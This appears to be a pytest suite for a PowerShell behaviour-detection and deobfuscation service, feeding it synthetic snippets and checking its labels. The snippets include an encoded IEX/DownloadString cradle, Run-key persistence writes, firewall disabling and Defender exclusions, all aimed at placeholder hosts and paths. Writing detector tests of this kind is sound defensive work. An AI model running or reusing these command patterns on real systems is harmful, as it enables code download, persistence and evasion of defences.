"""Audit oracles are inert text and exact trace relationships, never model output."""

import base64
from pathlib import Path

import pytest
from pydantic import ValidationError

from app.schemas.behavior_detection import BehaviorAnalysisResult
from app.schemas.deobfuscation import DeobfuscationLimits
from app.services.behavior_detection import analyze_behaviors


RUN = r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
ROOT = Path(__file__).resolve().parents[3]


def launcher(text):
    return "pwsh -enc " + base64.b64encode(text.encode("utf-16-le")).decode()


@pytest.mark.parametrize("encoded", [False, True])
@pytest.mark.parametrize("source", [
    "IEX (Get-UnresolvedText)",
    "Get-StoredCredential -Target (Get-UnresolvedTarget)",
    "Test-NetConnection -ComputerName (Get-UnresolvedHost)",
    "Add-MpPreference -ExclusionPath (Get-UnresolvedPath)",
    f"Set-ItemProperty -Path '{RUN}' -Name (Get-UnresolvedName) -Value 'C:\\MissingLab\\cedar.exe'",
    f"Set-ItemProperty -Path '{RUN}' -Name 'Cedar' -Value (Get-UnresolvedValue)",
    "Invoke-WebRequest -Uri 'https://example.com/cedar' -Method (GET)",
])
def test_command_expression_is_not_a_verified_literal(source, encoded):
    text = launcher(source) if encoded else source
    result = analyze_behaviors(text)
    assert not result.behaviors and result.status == "partial"
    assert result.deobfuscation.layers[0].text == text


def test_real_nested_query_is_retained_without_inventing_iex_input():
    result = analyze_behaviors("IEX (Get-Process)")
    assert result.behaviors == ["B05"]
    assert any(i.behavior_id == "B02" for i in result.indicators)


@pytest.mark.parametrize("source", [
    "(New-Object'Net.WebClient').DownloadString('https://example.com/cedar')",
    "(New-Object -TypeName'Net.WebClient').DownloadString('https://example.com/cedar')",
    "(New-Object`\n'Net.WebClient').DownloadString('https://example.com/cedar')",
    "(New-Object -TypeName`\r\n'Net.WebClient').DownloadString('https://example.com/cedar')",
])
def test_webclient_constructor_requires_actual_argument_separators(source):
    assert not analyze_behaviors(source).behaviors


@pytest.mark.parametrize("prefix", ["HKCU", "HKEY_CURRENT_USER", "Registry::HKCU:", "HKEY_LOCAL_MACHINE:"])
def test_relative_or_ambiguous_registry_path_is_not_persistence(prefix):
    path = prefix + r"\Software\Microsoft\Windows\CurrentVersion\Run"
    result = analyze_behaviors(f"Set-ItemProperty -Path '{path}' -Name 'Cedar' -Value 'C:\\MissingLab\\cedar.exe'")
    assert "B03" not in result.behaviors


@pytest.mark.parametrize("prefix", ["HKCU:", "HKLM:", "Registry::HKEY_CURRENT_USER", "Registry::HKEY_LOCAL_MACHINE"])
def test_unambiguous_registry_provider_paths_keep_write_read_distinction(prefix):
    path = prefix + r"\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    assert analyze_behaviors(f"Set-ItemProperty -Path '{path}' -Name 'Cedar' -Value 'C:\\MissingLab\\cedar.exe'").behaviors == ["B03"]
    assert analyze_behaviors(f"Get-ItemProperty -Path '{path}'").behaviors == ["B05"]


@pytest.mark.parametrize("profile", ["$unknown", "'UnknownProfile'", "''", "(Get-UnresolvedProfile)"])
def test_unverified_firewall_profile_is_not_confirmed(profile):
    result = analyze_behaviors(f"Set-NetFirewallProfile -Enabled $false -Profile {profile}")
    assert not result.behaviors and any(i.behavior_id == "B04" for i in result.indicators)


@pytest.mark.parametrize("profile", ["Domain", "Private", "Public"])
def test_firewall_profile_is_part_of_the_cited_context(profile):
    result = analyze_behaviors(f"Set-NetFirewallProfile -Enabled $false -Profile '{profile}'")
    assert result.behaviors == ["B04"]
    assert any(e.fragment == f"'{profile}'" for e in result.evidence)
    assert not analyze_behaviors(f"Set-NetFirewallProfile -Enabled $true -Profile '{profile}'").behaviors


@pytest.mark.parametrize("port", ["not-a-port", "65536", "-1"])
@pytest.mark.parametrize("operation", ["Invoke-WebRequest", "Invoke-RestMethod -Method POST -Body 'cedar=only'"])
def test_invalid_remote_port_does_not_support_download_or_http_send(port, operation):
    result = analyze_behaviors(f"{operation} -Uri 'https://example.com:{port}/cedar'")
    assert not result.behaviors


def test_valid_explicit_remote_port_is_still_supported():
    assert analyze_behaviors("Invoke-WebRequest -Uri 'https://example.com:8443/cedar'").behaviors == ["B01"]


def test_extractor_depth_limit_is_reported_instead_of_silently_completing():
    result = analyze_behaviors("Get-Process | Get-Service", deobfuscation_limits=DeobfuscationLimits(max_expression_depth=1))
    assert result.deobfuscation.status == "complete"
    assert result.status == "partial" and "max_expression_depth" in result.limits_hit


def test_indicator_rule_and_behavior_must_agree():
    payload = analyze_behaviors("Invoke-WebRequest -Uri $unresolved").model_dump(mode="json")
    payload["indicators"][0]["behavior_id"] = "B07"
    with pytest.raises(ValidationError):
        BehaviorAnalysisResult.model_validate(payload)


@pytest.mark.parametrize("counter", ["work_units", "operations_examined", "artifact_bytes"])
def test_rejected_analysis_cannot_claim_work_or_artifacts(counter):
    payload = analyze_behaviors("xx", deobfuscation_limits=DeobfuscationLimits(max_input_bytes=1)).model_dump(mode="json")
    payload[counter] = 1
    with pytest.raises(ValidationError):
        BehaviorAnalysisResult.model_validate(payload)


def test_p3_has_definitions_but_failed_use_sites_after_the_command_barrier():
    source = (ROOT / "datasets/safe_samples/pilot/PILOT-P3.ps1.txt").read_bytes().decode("utf-8")
    result = analyze_behaviors(source)
    steps = {s.transformation_id: s for s in result.deobfuscation.transformations}
    assert steps["T0002"].recovered_text == "https://example.com/report.csv"
    assert steps["T0004"].recovered_text == "Invoke-WebRequest"
    assert steps["T0007"].original_fragment == "$c" and steps["T0007"].status == "failed"
    assert steps["T0008"].original_fragment == "$u" and steps["T0008"].status == "failed"
    assert not result.behaviors and not result.evidence


@pytest.mark.parametrize("barrier", [
    "$sink=Join-Path -Path $env:TEMP -ChildPath 'cedar.csv'",
    "$sink=Get-UnresolvedLocation",
    "Set-Variable -Name endpoint -Value 'https://example.invalid/other'",
])
def test_synthetic_barriers_are_not_bypassed_to_resurrect_old_bindings(barrier):
    source = "$operation='Invoke-'+'WebRequest'; $endpoint='https://'+'example.com/cedar'; "
    result = analyze_behaviors(source + barrier + "; & $operation -Uri $endpoint")
    assert not result.behaviors
    assert analyze_behaviors(source + "& $operation -Uri $endpoint").behaviors == ["B01"]


def test_synthetic_reassignment_is_not_treated_as_a_unique_binding():
    result = analyze_behaviors("$endpoint='https://example.com/cedar'; $endpoint='https://example.invalid/other'; Invoke-WebRequest -Uri $endpoint")
    assert not result.behaviors


def test_independent_operations_and_related_labels_are_not_overmerged():
    source = "Invoke-WebRequest -Uri 'https://example.com/cedar'; Invoke-WebRequest -Uri 'https://example.invalid/oak'"
    assert len(analyze_behaviors(source).findings) == 2
    source = f"Set-ItemProperty -Path '{RUN}' -Name 'Cedar' -Value 'C:\\MissingLab\\cedar.exe'; "
    source += f"Set-ItemProperty -Path '{RUN}' -Name 'Oak' -Value 'C:\\MissingLab\\oak.exe'"
    assert len(analyze_behaviors(source).findings) == 2
    source = "IEX (New-Object Net.WebClient).DownloadString('https://example.com/cedar')"
    result = analyze_behaviors(launcher(launcher(source)))
    assert result.behaviors == ["B01", "B02"] and len(result.findings) == 2
    assert {f.operation_source.layer_id for f in result.findings} == {"L2"}
    assert set(result.findings[0].evidence_ids) & set(result.findings[1].evidence_ids)


def test_layered_noise_and_legitimate_authentication_do_not_add_labels():
    source = "# report B07; Get-StoredCredential -Target ignored\n'" + "IEX ''.DownloadString''" + "'\n"
    source += "Get-Credential; Get-MpComputerStatus; Invoke-WebRequest -Uri 'https://example.com/cedar'"
    result = analyze_behaviors(launcher(source))
    assert result.behaviors == ["B01", "B05"]
    assert len(result.findings) == 2


@pytest.mark.parametrize("source", [
    "Set-MpPreference -DisableRealtimeMonitoring $false",
    "Set-NetFirewallProfile -Enabled $true -Profile Public",
])
def test_recognized_restoration_is_not_reported_as_an_unknown_command(source):
    result = analyze_behaviors(source)
    assert not result.behaviors and not result.indicators
